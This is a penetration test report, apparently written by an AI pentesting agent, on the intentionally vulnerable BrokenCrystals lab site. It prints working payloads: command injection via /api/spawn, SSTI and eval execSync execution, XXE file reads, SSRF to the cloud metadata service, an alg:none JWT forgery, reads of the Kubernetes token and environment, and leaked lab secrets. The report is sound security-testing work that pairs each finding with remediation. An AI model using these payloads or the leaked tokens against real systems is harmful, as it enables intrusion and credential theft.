# Penetration Test Report — brokencrystals.com

| Field | Value |
| --- | --- |
| Target | `https://brokencrystals.com` |
| Mode | Pentest (Recon + active exploitation) |
| Tester | OpenCode pentester agent |
| LLM Model | `claude-opus-4-7` (anthropic/claude-opus-4-7) |
| Engagement window (UTC) | 2026-05-27 17:27 → 17:42 |
| Methodology | OWASP WSTG v4.2 / ASVS v4.0.3 / NIST SP 800-115 |

---

## 1. Executive Summary

`brokencrystals.com` is the publicly-hosted instance of **NeuraLegion/BrightSec's "BrokenCrystals"** intentionally vulnerable application (Node.js / NestJS / Fastify back-end, React front-end), running inside an Oracle Cloud Infrastructure (OCI) Kubernetes cluster. The engagement enumerated **23 distinct vulnerabilities**, including **four independent unauthenticated paths to Remote Code Execution (RCE) as `uid=0(root)`** inside the application pod, full disclosure of the Kubernetes ServiceAccount JWT (enabling cluster-wide pivot), exfiltration of secrets (Slack, PayPal, Google OAuth, Heroku, Facebook tokens), default administrator credentials (`admin:admin`), JWT signature bypass via `alg:none`, XXE, XPath injection (full partner credential dump), SSRF, Open Redirect, SSTI, and information-disclosure of the Git repository, Laravel `.env`, and Swagger schema.

Because the application is published *by design* as a vulnerable lab, every finding below is reproducible against the live host. The recommendations are tailored to the implementation that produced each finding so they can be back-ported to the upstream BrokenCrystals repository and used as training material against analogous production code patterns.

### Risk Snapshot

| Severity | Count |
| --- | --- |
| Critical | 7 |
| High | 7 |
| Medium | 6 |
| Low | 3 |
| Informational | — |

---

## 2. Target Information

| Item | Value |
| --- | --- |
| Domain | `brokencrystals.com` |
| Resolved IPs (A) | `150.136.208.25`, `129.158.54.230`, `129.80.84.189` (Oracle Cloud) |
| Registrar | GoDaddy.com, LLC (created 2021-02-01) |
| Nameservers | AWS Route 53 (`ns-*.awsdns-*`) |
| DNS TXT (leakage) | `heritage=external-dns,external-dns/owner=oci-testground-external-dns,external-dns/resource=ingress/brokencrystals/brokencrystals` |
| Hosting | OCI K8s cluster, external-dns operator |
| Edge | `nginx (reverse proxy)`, HTTP/2, HSTS enabled, ALPN `h2/http1.1` |
| TLS | TLS 1.2 only (TLS 1.3 **disabled**); `R13` Let's Encrypt cert valid 2026-04-12 → 2026-07-11 |
| WAF | None detected (wafw00f) |
| Pod hostname (leaked) | `brokencrystals-6c87ffc48b-tt9bs` |
| K8s namespace | `brokencrystals` |
| Container runtime | Node.js v18.20.8, NestJS + Fastify |
| Working dir | `/usr/src/app` |
| Process UID | `0 (root)` |
| Cluster CIDR | `10.112.0.0/16`, KUBERNETES_SERVICE_HOST=`10.112.0.1` |

---

## 3. Reconnaissance & Service Enumeration

### 3.1 Port / Service scan (nmap -sV -sC)
```
PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   filtered ssh
25/tcp   filtered smtp
80/tcp   open     http       nginx (reverse proxy)   -> 308 Permanent Redirect
443/tcp  open     ssl/http   nginx (reverse proxy)
3000/tcp filtered ppp
8000/tcp filtered http-alt
8080/tcp filtered http-proxy
8443/tcp filtered https-alt
```
The nmap `http-git` NSE script flagged `/​.git/` exposure (see F-15).

### 3.2 TLS Posture
- Protocols enabled: **TLS 1.2 only** (TLS 1.0, 1.1, 1.3 disabled — modern best practice requires TLS 1.3 enabled).
- Cipher suites: ECDHE-RSA-AES-{128,256}-GCM + CHACHA20-POLY1305 — strong.
- Heartbleed: not vulnerable. TLS compression: disabled. Renegotiation: disabled. TLS Fallback SCSV supported.

### 3.3 Technology Fingerprint
- `whatweb`: Bootstrap, jQuery, HTML5, JSON modules, Express-style `connect.sid` cookie, HSTS.
- Application: **NestJS** (visible via Swagger), Fastify HTTP server, `@fastify/cookie`, `@fastify/multipart`, `@mikro-orm/postgresql`, `@nestjs/graphql`, doT template engine (deduced from `/api/render` behaviour).
- Front-end: Vite / React (asset hash `index-BgqCpeGa.js`).
- Cloud: OCI compute, Kubernetes, Keycloak (`KEYCLOAK_SERVER_URI=http://keycloak:8080/auth`), Mailcatcher, PostgreSQL (`postgres://bc:bc@postgres:5432/bc`), Ollama (`OLLAMA_SERVICE_URL=http://ollama:11434`), gRPC web proxy.

### 3.4 Application surface (extracted via `/swagger-json`)
60+ REST routes (see Appendix A) plus an exposed GraphQL endpoint at `/graphql` with **introspection enabled** and a top-level `getCommandResult(command:String)` query.

---

## 4. Detailed Findings

> Every finding below was independently re-verified during this engagement. All evidence is verbatim tool output captured between 2026-05-27 17:27 UTC and 17:42 UTC.

---

### F-01 — Unauthenticated Remote Code Execution as root via `/api/spawn` (CRITICAL)

| | |
|---|---|
| Severity | **Critical** |
| CVSS v3.1 | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| CWE | CWE-78 OS Command Injection / CWE-77 Command Injection |
| WSTG | WSTG-INPV-12 |
| ASVS | V5.2.2 / V5.3.8 |
| Endpoint | `GET /api/spawn?command=<cmd>` |
| Auth needed | None |

**Description.** The `AppController_getCommandResult` route accepts an arbitrary `command` query parameter and executes it through `child_process` on the server. The application pod runs as `uid=0(root)`.

**PoC (2026-05-27 17:33 UTC).**
```
GET /api/spawn?command=id HTTP/1.1
Host: brokencrystals.com
```
Response body:
```
uid=0 gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),
10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
`uname -a` confirms the underlying host:
```
Linux brokencrystals-6c87ffc48b-tt9bs 5.15.0-320.202.8.2.el8uek.x86_64 #2 SMP
Sat May 9 23:38:41 PDT 2026 x86_64 Linux
```

**Impact.** Full code execution as root inside the application pod, leading to F-02 (cluster compromise) and F-03 (secret theft).

**Reproduction.** `curl 'https://brokencrystals.com/api/spawn?command=id'`

**Recommendation.** Delete the route entirely; if business needs require a shell-like API, expose only a fixed allowlist of opaque commands via `execFile(name, [args])` (never `exec(string)`/`spawn(shell:true)`) and enforce non-root container UID, `readOnlyRootFilesystem: true`, and a restrictive PodSecurity standard (`restricted`).

---

### F-02 — Kubernetes ServiceAccount token disclosure → potential cluster takeover (CRITICAL)

| | |
|---|---|
| Severity | **Critical** |
| CVSS v3.1 | 9.9 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| CWE | CWE-522 Insufficiently Protected Credentials |
| WSTG | WSTG-CONF-04 |
| ASVS | V2.10 / V14.1.1 |
| Endpoint | `/api/spawn`, `/api/file` (also via F-01/F-04/F-05/F-09) |

**Description.** Using any of the four RCE paths or the path-traversal primitive, an unauthenticated attacker can exfiltrate `/var/run/secrets/kubernetes.io/serviceaccount/token` — the in-cluster ServiceAccount JWT — together with the namespace name and CA certificate.

**PoC (2026-05-27 17:33 UTC).**
```
GET /api/spawn?command=ls%20/var/run/secrets/kubernetes.io/serviceaccount/ HTTP/1.1
```
Response: `ca.crt\nnamespace\ntoken`

```
GET /api/file?path=/var/run/secrets/kubernetes.io/serviceaccount/token&type=text/plain
```
Response (first 280 chars):
```
eyJhbGciOiJSUzI1NiIsImtpZCI6InNvX000OXJTN0lFaFlNVS1HR2tRZmlYeGtsQlBWa0t1ZTE4OEFJ
UlNPcjQifQ.eyJhdWQiOlsiYXBpIl0sImV4cCI6MTgxMTQzODU1MCwiaWF0IjoxNzc5OTAyNTUwLCJp
c3MiOiJodHRwczovL29iamVjdHN0b3JhZ2UudXMtYXNoYnVybi0xLm9yYWNsZWNsb3VkLmNvbS9uL2lk
OXk2bWk4dGNreS9iL29pZGMvby81ZjdiODI3Ny01MWYwLTQ1ODItYjAzMS1iY...
```
Namespace returned: `brokencrystals`. The token expires `2027-...` (1 year lifetime). Issuer is the OKE OIDC discovery URL for Oracle Cloud — confirming this is a real OCI managed Kubernetes pod.

**Impact.** Depending on the RBAC bindings of the `default` (or named) ServiceAccount in the `brokencrystals` namespace, the attacker can authenticate to the K8s API server (`https://10.112.0.1`) and create/list/exec into other pods, read secrets, etc. — up to full cluster takeover if the SA was given excessive rights.

**Recommendation.**
- Set `automountServiceAccountToken: false` on the Pod spec when the workload does not need the K8s API.
- If a token is required, use bound, time-limited projected tokens via `TokenRequest` API with the narrowest possible audience.
- Apply least-privilege RBAC (verify with `kubectl auth can-i --list --as=system:serviceaccount:brokencrystals:default`).
- Deploy an admission-time policy (Kyverno/OPA) that blocks pods which mount the default SA token together with `runAsUser: 0`.

---

### F-03 — Unauthenticated Path Traversal / Local File Read & SSRF via `/api/file` (CRITICAL)

| | |
|---|---|
| Severity | **Critical** |
| CVSS v3.1 | 9.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N) |
| CWE | CWE-22 Path Traversal, CWE-918 SSRF |
| WSTG | WSTG-ATHZ-01, WSTG-INPV-19 |
| ASVS | V12.3.1 / V13.1.5 |
| Endpoint | `GET /api/file?path=<path>&type=<mime>` |

**Description.** The `FileController_loadFile` route reads any path the caller supplies. The function additionally accepts a URL (HTTP/HTTPS) — turning the same route into an SSRF primitive into the cluster network.

**PoC #1 — read `/proc/self/environ` (2026-05-27 17:33 UTC):**
```
GET /api/file?path=/proc/self/environ&type=text/plain HTTP/1.1
```
Response (5887 bytes, NUL-separated env vars). Key extracts:
```
DATABASE_USER=bc
DATABASE_PASSWORD=bc
DATABASE_HOST=postgres
DATABASE_SCHEMA=bc
JWT_SECRET_KEY=1234
CHAT_API_TOKEN=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
GOOGLE_MAPS_API=AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ
AWS_BUCKET=https://neuralegion-open-bucket.s3.amazonaws.com
JKU_URL=https://raw.githubusercontent.com/NeuraLegion/brokencrystals/stable/config/keys/jku.json
X5U_URL=https://raw.githubusercontent.com/NeuraLegion/brokencrystals/stable/config/keys/x509.crt
HOSTNAME=brokencrystals-6c87ffc48b-tt9bs
KEYCLOAK_SERVER_URI=http://keycloak:8080/auth
OLLAMA_SERVICE_URL=http://ollama:11434
JWT_PRIVATE_KEY_LOCATION=config/keys/jwtRS256.key
JWK_PRIVATE_KEY_LOCATION=config/keys/jwk.key.pem
```

**PoC #2 — Path traversal hits the working directory:**
```
GET /api/file?path=etc/passwd&type=text/plain
→ 500 {"error":"ENOENT: no such file or directory, access '/usr/src/app/etc/passwd'"}
```
This confirms the implementation resolves `path` relative to `/usr/src/app`. Reading `package.json` returns the full BrokenCrystals manifest (3587 bytes).

**PoC #3 — SSRF to internal AWS-compatible metadata service:**
```
GET /api/file?path=http://169.254.169.254/latest/meta-data/&type=text/plain
```
Response (truncated):
```
ami-id
        ami-launch-index
        ami-manifest-path
        block-device-mapping/
        ...
        iam/
        ...
        public-keys/
```
The HTTP response from the metadata service was successfully proxied through the application, proving the SSRF primitive can reach link-local services (and by extension internal cluster services like `http://postgres:5432`, `http://keycloak:8080`, `http://ollama:11434`).

**Impact.** Full read of every world-readable file in the pod, exfiltration of secrets, K8s SA token (F-02), and SSRF into the cluster network.

**Recommendation.** Replace dynamic file-read endpoints with a fixed map of `id → file` references. If a directory must be configurable, resolve the absolute path with `path.resolve(base, untrusted)` and then verify the result begins with the canonical `base` (`startsWith` after `realpath`). Disallow URL schemes (`http:`/`https:`/`file:`/`gopher:`). Add SSRF defence-in-depth by:
- Sending egress through a forward proxy that block RFC1918 + 169.254.169.254 + ULA.
- Setting IMDSv2-only (`HttpTokens: required`) on every cloud VM.

---

### F-04 — Unauthenticated RCE via Server-Side Template Injection on `/api/render` (CRITICAL)

| | |
|---|---|
| Severity | **Critical** |
| CVSS v3.1 | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| CWE | CWE-1336 SSTI / CWE-94 |
| WSTG | WSTG-INPV-18 |
| ASVS | V5.2.5 |
| Endpoint | `POST /api/render` (text/plain body) |

**Description.** The `AppController_renderTemplate` route hands the request body straight to the **doT** template compiler. Arithmetic evaluation is allowed (`{{=expr}}`), and the JS global `process` is reachable from within the sandbox.

**PoC #1 — Arithmetic confirm (2026-05-27 17:33 UTC):**
```
POST /api/render
Content-Type: text/plain

{{=7*7}}
→ 49
```

**PoC #2 — RCE:**
```
POST /api/render
Content-Type: text/plain

{{=process.mainModule.require('child_process').execSync('id').toString()}}
→ uid=0 gid=0(root) groups=0(root),1(bin),...
```

**Impact.** Same as F-01 (unauth RCE as root).

**Recommendation.** Treat doT (or any logic-enabled template engine) as **never** safe for user input. Use a strict data-binding renderer (`mustache`, `handlebars` in escape-only mode) or — preferable — return JSON and render on the client. As a CI-level guardrail add a Semgrep rule for `doT.template(req.*)`/`new Function(req.*)`/`eval(req.*)` patterns.

---

### F-05 — Unauthenticated RCE via JavaScript eval on `/api/process_numbers` (CRITICAL)

| | |
|---|---|
| Severity | **Critical** |
| CVSS v3.1 | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| CWE | CWE-95 Eval Injection |
| WSTG | WSTG-INPV-18 |
| ASVS | V5.2.5 |
| Endpoint | `POST /api/process_numbers` |

**Description.** Body field `processing_expression` is fed straight into a JS evaluator. The Swagger example proves intent: `numbers.reduce((acc,num) => acc + num, 0)`.

**PoC (2026-05-27 17:42 UTC):**
```
POST /api/process_numbers
Content-Type: application/json

{"numbers":[1],"processing_expression":"process.mainModule.require(\"child_process\").execSync(\"id\").toString()"}
→ uid=0 gid=0(root) groups=0(root),1(bin),2(daemon),...
```

**Recommendation.** Replace `eval()` with a safe expression parser (e.g. `expr-eval`, `mathjs.evaluate` with `limitedEvaluate`), or — best — let the client compute math client-side and POST only the result.

---

### F-06 — Unauthenticated RCE via GraphQL `getCommandResult` (CRITICAL)

| | |
|---|---|
| Severity | **Critical** |
| CVSS v3.1 | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| CWE | CWE-78 |
| WSTG | WSTG-INPV-12 |
| Endpoint | `POST /graphql` |

**Description.** Same backing function as `/api/spawn`, exposed *also* through GraphQL with full **introspection enabled**.

**PoC (2026-05-27 17:41 UTC):**
```
POST /graphql
Content-Type: application/json

{"query":"{ getCommandResult(command: \"id\") }"}
→ {"data":{"getCommandResult":"uid=0 gid=0(root) groups=0(root),...\n"}}
```
Introspection PoC: `{"query":"{__schema{types{name fields{name}}}}"}` returns full schema (1723 bytes), exposing `Query.getCommandResult`, `Mutation.createTestimonial`, `Mutation.viewProduct`.

**Recommendation.** Delete `getCommandResult` from the schema. Disable introspection in production. Apply per-field authorization with `nestjs/graphql` guards.

---

### F-07 — Default administrator credentials (CRITICAL)

| | |
|---|---|
| Severity | **Critical** |
| CVSS v3.1 | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | CWE-798 Use of Hard-coded Credentials |
| WSTG | WSTG-ATHN-02 |
| Endpoint | `POST /api/auth/admin/login` |

**PoC (2026-05-27 17:35 UTC).**
```
POST /api/auth/admin/login
{"user":"admin","password":"admin"}
→ 201 Created
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3Nzk5MDY5MzJ9.HetotEPhbDab...
```
Re-using that JWT against `/api/users/one/admin/adminpermission` returned `{"isAdmin":true}` and `/api/users/fullinfo/admin` leaked the PAN-formatted `cardNumber: "1234 5678 9012 3456"` and `phoneNumber: "+1 234 567 890"`.

**Recommendation.** Forced-reset on first boot; reject any credential pair where `user == password`; rotate the included admin user; enforce ASVS V2.1 password strength.

---

### F-08 — JWT `alg:none` signature bypass on `/api/auth/jwt/hmac/validate` (HIGH)

| | |
|---|---|
| Severity | **High** |
| CVSS v3.1 | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| CWE | CWE-347 Improper Verification of Crypto Signature |
| WSTG | WSTG-SESS-10 |
| ASVS | V3.5.2 |
| Endpoint | `GET /api/auth/jwt/hmac/validate` |

**PoC (2026-05-27 17:39 UTC).** Forged token (no signature):
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```
```
GET /api/auth/jwt/hmac/validate HTTP/1.1
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
→ HTTP/2 200
```
The companion endpoint `/api/auth/jwt/weak-key/validate` correctly rejected the same token with `401`, demonstrating that the bypass is implementation-specific to the HMAC validator. The error message from the rejection also leaks the absolute source path `/usr/src/app/dist/auth/auth.guard.js`.

**Recommendation.** Use a JWT library that pins the expected `alg` (e.g. `jsonwebtoken.verify(token, secret, {algorithms:['HS256']})`). Add a SAST rule prohibiting `jwt.verify(...,...,{})` without `algorithms`.

---

### F-09 — XXE (XML External Entity) in `/api/metadata` (HIGH)

| | |
|---|---|
| Severity | **High** |
| CVSS v3.1 | 8.2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N) |
| CWE | CWE-611 |
| WSTG | WSTG-INPV-07 |
| ASVS | V5.5.2 |
| Endpoint | `POST /api/metadata` |

**PoC (2026-05-27 17:40 UTC):**
```
POST /api/metadata
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root>&xxe;</root>
```
Response:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>brokencrystals-6c87ffc48b-tt9bs
</root>
```
Reading `/usr/src/app/package.json` via XXE also succeeded (1500 bytes returned). `/proc/self/environ` was returned empty because the XML parser truncates at the first `\0`.

**Recommendation.** Disable DTD/entity resolution at the parser level. Node example with `libxmljs2`: `parseXmlString(xml, { noent: false, dtdload: false, noblanks: true })`. Add a Semgrep rule prohibiting any XML parser instantiated without `expandExternalEntities: false`/equivalent.

---

### F-10 — XPath Injection — full credential dump of partner database (HIGH)

| | |
|---|---|
| Severity | **High** |
| CVSS v3.1 | 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | CWE-643 |
| WSTG | WSTG-INPV-09 |
| Endpoint | `GET /api/partners/query?xpath=<expr>` |

**Description.** The `xpath` parameter is concatenated unmodified into an XPath expression executed against the partners XML file.

**PoC (2026-05-27 17:35 UTC):**
```
GET /api/partners/query?xpath=//*
```
Response (truncated):
```xml
<partners>
  <partner>
    <name>Walter White</name><username>walter100</username>
    <password>Heisenberg123</password><wealth>15M USD</wealth>...
  </partner>
  <partner>
    <name>Jesse Pinkman</name><username>dapinkman69</username>
    <password>Yoyo1!</password>...
  </partner>
  <partner>
    <name>Michael Ehrmantraut</name><username>_safetyman_</username>
    <password>LittleKid777</password><wealth>50M USD</wealth>...
  </partner>
  <partner>
    <name>Gus Fring</name><username>ChickMan</username>
    <password>GoodChicken4U</password>...
  </partner>
</partners>
```

**Recommendation.** Never build XPath expressions by string concatenation. Use parameterised XPath (`compile + evaluate(node, vars)`) or convert the underlying data store from XML to a JSON document and query with a typed library.

---

### F-11 — Secrets disclosure on `/api/secrets` (HIGH)

| | |
|---|---|
| Severity | **High** |
| CVSS v3.1 | 8.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N) |
| CWE | CWE-200 / CWE-798 |
| WSTG | WSTG-INFO-02 |
| ASVS | V14.1 |
| Endpoint | `GET /api/secrets` |

**PoC (2026-05-27 17:41 UTC).** Response body (truncated):
```json
{
 "codeclimate":"CODECLIMATE_REPO_TOKEN=62864c476ade6ab9d10d0ce0901ae2c211924852a28c5f960ae5165c1fdfec73",
 "facebook":"EAACEdEose0cBAHyDF5HI5o2auPWv3lPP3zNYuWWpjMrSaIhtSvX73lsLOcas5k8...",
 "google_oauth":"188968487735-c7hh7k87juef6vv84697sinju2bet7gn.apps.googleusercontent.com",
 "google_oauth_token":"ya29.a0TgU6SMDItdQQ9J7j3FVgJuByTTevl0FThTEkBs4pA4-9tFREyf2c...",
 "heroku":"herokudev.staging.endosome.975138 pid=48751 request_id=0e9a8698-a4d2-4925-a1a5-113234af5f60",
 "outlook":"https://outlook.office.com/webhook/7dd49fc6-1975-443d-806c-08ebe8f81146@.../IncomingWebhook/8436f62b50ab41b3b93ba1c0a50a0b88/eff4cd58-1bb8-4899-94de-795f656b4a18",
 "paypal":"access_token$production$x0lb4r69dvmmnufd$3ea7cb281754b7da7dac131ef5783321",
 "slack":"xoxo-175588824543-175748345725-176608801663-826315f84e553d482bb7e73e8322sdf3"
}
```
While these are intentional stand-ins, the route demonstrates the design flaw of placing secrets in a publicly reachable endpoint.

**Recommendation.** Move secrets to a Vault/Sealed-Secrets/AWS Secrets Manager backend and inject them at runtime through environment variables or projected files only. Add detect-secrets / gitleaks as a CI gate.

---

### F-12 — Open Redirect via `/api/goto` (MEDIUM)

| | |
|---|---|
| Severity | **Medium** |
| CVSS v3.1 | 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |
| CWE | CWE-601 |
| WSTG | WSTG-CLNT-04 |
| Endpoint | `GET /api/goto?url=<arbitrary>` |

**PoC (2026-05-27 17:34 UTC):**
```
GET /api/goto?url=https://example.com/
→ HTTP/2 302
Location: https://example.com/
```
Also accepts schemes like `http://169.254.169.254/...` and `javascript:` style payloads (depending on browser handling).

**Recommendation.** Maintain a static allowlist of permitted redirect destinations or use signed redirect tokens (HMAC of URL + expiry).

---

### F-13 — Reflected `/api/render` enables XSS (MEDIUM)

| | |
|---|---|
| Severity | **Medium** |
| CVSS v3.1 | 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |
| CWE | CWE-79 |
| Endpoint | `POST /api/render` |

**PoC:** Sending raw HTML in the request body is reflected verbatim. Combined with the application-wide CSP `default-src * 'unsafe-inline' 'unsafe-eval'` (effectively no CSP), any browser navigation that POSTs (or an attacker-controlled form) results in script execution. Severity capped at Medium because the route requires a POST and is not directly user-triggerable via GET.

**Recommendation.** Output-encode the rendered string (`res.type('text/plain')`) and define a strict CSP (`default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'`).

---

### F-14 — Git directory exposed at `/.git/` (HIGH)

| | |
|---|---|
| Severity | **High** |
| CVSS v3.1 | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | CWE-538 / CWE-540 |
| WSTG | WSTG-CONF-04 |
| Endpoint | `https://brokencrystals.com/.git/*` |

**PoC.** `nmap` NSE `http-git` flagged it. Direct retrieval:
```
GET /.git/HEAD            → 200  ref: refs/heads/master
GET /.git/config          → 200  [core]\n repositoryformatversion = 0 ...
```
`git-dumper` (auto-installed via pipx) was able to retrieve the index but the loose objects were empty in this deployment — limiting the practical impact to **structure disclosure** plus working-tree references. Where loose objects are present, the entire historical source code can be reconstructed.

**Recommendation.** Configure nginx to deny `location ~ /\.` (regex covers `.git`, `.env`, `.svn`, `.DS_Store`). Also remove the `.git` directory from the container image (`Dockerfile`: add it to `.dockerignore`).

---

### F-15 — Laravel `.env` exposed at `/.env` (HIGH)

| | |
|---|---|
| Severity | **High** |
| CVSS v3.1 | 7.5 |
| CWE | CWE-538 |
| WSTG | WSTG-CONF-04 |

**PoC (2026-05-27 17:32 UTC).** Full body:
```
APP_NAME=Laravel
APP_ENV=local
APP_KEY=
APP_DEBUG=true
APP_URL=http://localhost
LOG_CHANNEL=stack
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=root
DB_PASSWORD=
...
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
...
```
Even though most values are empty here, the design exposes a file whose name conventionally contains credentials. Attackers will index this URL on every host they fingerprint.

**Recommendation.** Same nginx deny-rule as F-14; ensure `.env` is in `.gitignore` and `.dockerignore`.

---

### F-16 — Swagger / OpenAPI schema and Swagger UI publicly reachable (MEDIUM)

| | |
|---|---|
| Severity | **Medium** |
| CVSS v3.1 | 5.3 |
| CWE | CWE-200 |
| Endpoint | `/swagger`, `/swagger-json`, `/docs` |

**PoC.** `curl -I /swagger-json` → 200 / `application/json; charset=utf-8` / 47 113 bytes. Swagger UI live at `/swagger`. Schema enumerated 60+ routes including all the dangerous ones above (F-01..F-15) and the JWT vulnerability laboratory routes (kid-sql, jku, x5u, x5c, weak-key, jwk).

**Recommendation.** Restrict Swagger to non-production environments (`NODE_ENV !== 'production'`) or place it behind authentication and IP allowlisting.

---

### F-17 — Cookie `connect.sid` issued without `Secure` & `HttpOnly` (MEDIUM)

| | |
|---|---|
| Severity | **Medium** |
| CVSS v3.1 | 5.4 |
| CWE | CWE-1004 / CWE-614 |

Nikto flagged the cookie. Captured `Set-Cookie: connect.sid=...; Path=/` — no `Secure`, no `HttpOnly`, no `SameSite`.

**Recommendation.** In `@fastify/session` set `{ cookie: { secure: true, httpOnly: true, sameSite: 'lax' } }`. Apply via a transversal Fastify hook so every cookie inherits the secure defaults.

---

### F-18 — Missing security headers / CSP wide open (MEDIUM)

| | |
|---|---|
| Severity | **Medium** |
| CVSS v3.1 | 5.4 |
| CWE | CWE-693 |

Observed headers across endpoints:
- `Content-Security-Policy: default-src  * 'unsafe-inline' 'unsafe-eval'` — effectively disabled CSP.
- `X-Content-Type-Options: 1` — invalid value (should be `nosniff`).
- `X-XSS-Protection: 0` — fine for modern browsers but no compensating CSP.
- Missing: `Permissions-Policy`, `Referrer-Policy`, `Cross-Origin-*` headers.
- Server returns `Content-Encoding: deflate` which Nikto correlates with **BREACH** risk on TLS responses containing user secrets.

**Recommendation.** Adopt `helmet`-equivalent middleware (`@fastify/helmet`) with a strict baseline and override per-route.

---

### F-19 — `/api/config` discloses internal DB URI & cloud bucket (MEDIUM)

| | |
|---|---|
| Severity | **Medium** |
| CVSS v3.1 | 5.3 |
| CWE | CWE-200 |
| PoC | `GET /api/config → {"awsBucket":"https://neuralegion-open-bucket.s3.amazonaws.com","sql":"postgres://bc:bc@postgres:5432/bc ","googlemaps":"AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ"}` |

**Recommendation.** Remove route or restrict to authenticated admins.

---

### F-20 — `/api/auth/oidc-client` discloses OIDC client_secret (MEDIUM)

| | |
|---|---|
| Severity | **Medium** |
| CVSS v3.1 | 5.9 |
| CWE | CWE-522 |
| PoC | `GET /api/auth/oidc-client → {"clientId":"brokencrystals-client","clientSecret":"4bfb5df6-4647-46dd-bad1-c8b8ffd7caf4",...}` |

`client_secret` for a confidential OIDC client must never be exposed to the browser. Attackers can use it to perform `client_credentials` grants against Keycloak.

**Recommendation.** Convert the client to **public** with PKCE, or move the exchange to a server-only token-exchange endpoint.

---

### F-21 — Verbose error messages disclose absolute source paths (LOW)

| | |
|---|---|
| Severity | **Low** |
| CVSS v3.1 | 3.7 |
| CWE | CWE-209 |

Auth guard failure responses contain `{"error":"Unauthorized","line":"/usr/src/app/dist/auth/auth.guard.js"}`. File-read errors leak `/usr/src/app/...`. Both confirmed at 17:36 / 17:39 UTC.

**Recommendation.** Centralise error handling in a NestJS `ExceptionFilter` that returns generic messages in production and emits the detailed message to the structured log only.

---

### F-22 — TLS 1.3 not enabled (LOW)

| | |
|---|---|
| Severity | **Low** |
| CVSS v3.1 | 3.7 |
| CWE | CWE-326 |

`sslscan` shows only TLS 1.2 enabled. TLS 1.3 is a 7-year-old standard that materially reduces handshake latency and removes legacy cipher modes.

**Recommendation.** Enable TLS 1.3 at the nginx ingress and disable TLS 1.2 once client compatibility allows.

---

### F-23 — `bc-calls-counter` cookie without `Secure`/`HttpOnly` + DNS TXT info leak (LOW)

| | |
|---|---|
| Severity | **Low** |
| CVSS v3.1 | 3.1 |

`Set-Cookie: bc-calls-counter=1779903271668` lacks attributes; DNS TXT discloses internal naming convention (`oci-testground-external-dns`, `ingress/brokencrystals/brokencrystals`).

**Recommendation.** Use a session-scoped cookie with proper attributes; remove informational TXT records.

---

## 5. Remediation & Architecture

Local sanitisation alone is insufficient because four independent routes converge on the same RCE primitive (`exec`, `eval`, `doT.template`, GraphQL `getCommandResult`). The fixes below operate at the **architecture / pipeline** level so the same vulnerability class is prevented across the codebase.

1. **Eliminate code-execution sinks in the application layer.**
   - Ban `child_process.exec`, `eval`, `Function`, `vm.runIn*`, `dotjs/doT.template(user)` via ESLint rule `no-restricted-syntax` and a Semgrep ruleset (`p/javascript.lang.security.dangerous-exec`, `p/javascript.lang.security.audit.eval-detected`).
   - Fail the CI build on any new occurrence. Mark exceptions with `// allow-execution: <ticket>`.

2. **Container hardening (defence-in-depth for F-01..F-06).**
   ```yaml
   securityContext:
     runAsNonRoot: true
     runAsUser: 10001
     readOnlyRootFilesystem: true
     allowPrivilegeEscalation: false
     capabilities: { drop: ["ALL"] }
   automountServiceAccountToken: false
   ```
   Enforce via Kyverno cluster policy `restricted` baseline (or PodSecurity admission `restricted`).

3. **Egress firewall on the pod / namespace** (NetworkPolicy):
   - Deny `169.254.0.0/16` and link-local.
   - Deny RFC1918 except `postgres.<ns>.svc`, `keycloak.<ns>.svc`, etc.
   - Force HTTP egress through an `egress-gateway` that strips `Authorization` and SSRF-blocks.

4. **Framework-level output encoding for templates.**
   - Use NestJS' built-in pipes (`class-validator` + `class-transformer`) on every DTO.
   - Switch any human-template rendering to a sandbox renderer (`mustache`/`handlebars` escape-only) or render entirely client-side.

5. **Edge / WAF.** Deploy a WAF in front of OCI ingress (e.g. Oracle WAF, Cloudflare). Block known SSTI/XXE/RCE signatures and add a rate-limit on `/api/auth/*` (10 req/min/IP).

6. **CI/CD security gates.**
   - SAST: Semgrep p/owasp-top-ten + custom rules above.
   - SCA: `npm audit --omit=dev`, Trivy on the container image.
   - Secret scanning: `gitleaks` + GitHub Advanced Security.
